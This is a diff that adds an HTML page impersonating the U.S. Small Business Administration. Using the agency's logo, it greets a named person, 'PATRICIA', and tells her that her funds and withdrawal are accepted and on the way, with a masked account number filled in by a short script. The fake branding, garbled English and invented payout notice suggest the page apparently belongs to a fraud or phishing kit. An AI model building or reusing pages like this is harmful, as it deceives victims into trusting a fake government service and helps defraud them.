@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Small Business Administration</title>
+    <link rel="stylesheet" href="main.css">
+    <link rel="stylesheet" href="css.css">
+    
+</head>
+<body>
+    <div class="header">
+        <a href="index.html">
+            <img src="https://www.familydocs.org/wp-content/uploads/2020/04/SBA-logo-color.png" alt="">
+        </a>
+    </div>
+    <div class="data">
+        <div class="head">
+            <h1>Hello, PATRICIA</h1>
+            <p id="fecha-actual"></p>
+        </div>
+        <div class="head2">
+            <h3>Applications</h3>
+        </div>
+        <div class="text">
+            <div><h3>Congratulations yours funds are being processed</h3><p>x</p></div>
+            <p>Your withdrawal was receive and accepted when it is on the way to your account <p id="cardnumber"></p> you will receive an email with the most updated information Congratulations!</p>
+        </div>
+    </div>
+
+    <script>
+        const saludoElement = document.querySelector('#cardnumber');
+        const nombre = localStorage.getItem('nombre');
+        saludoElement.textContent = `xxxxxxxxx${nombre}.`;
+        const meses = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+const dias = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
+
+const fechaActual = new Date();
+
+const diaSemana = dias[fechaActual.getDay()];
+const diaMes = fechaActual.getDate();
+const mes = meses[fechaActual.getMonth()];
+const año = fechaActual.getFullYear();
+
+const sufijoDia = obtenerSufijoDia(diaMes);
+
+const fechaTexto = `Today is ${diaSemana}, ${mes} ${diaMes}${sufijoDia}, ${año}.`;
+
+document.getElementById("fecha-actual").textContent = fechaTexto;
+
+function obtenerSufijoDia(dia) {
+  if (dia > 3 && dia < 21) return "th";
+  switch (dia % 10) {
+    case 1:  return "st";
+    case 2:  return "nd";
+    case 3:  return "rd";
+    default: return "th";
+  }
+}
+    </script>
+</body>
+</html>
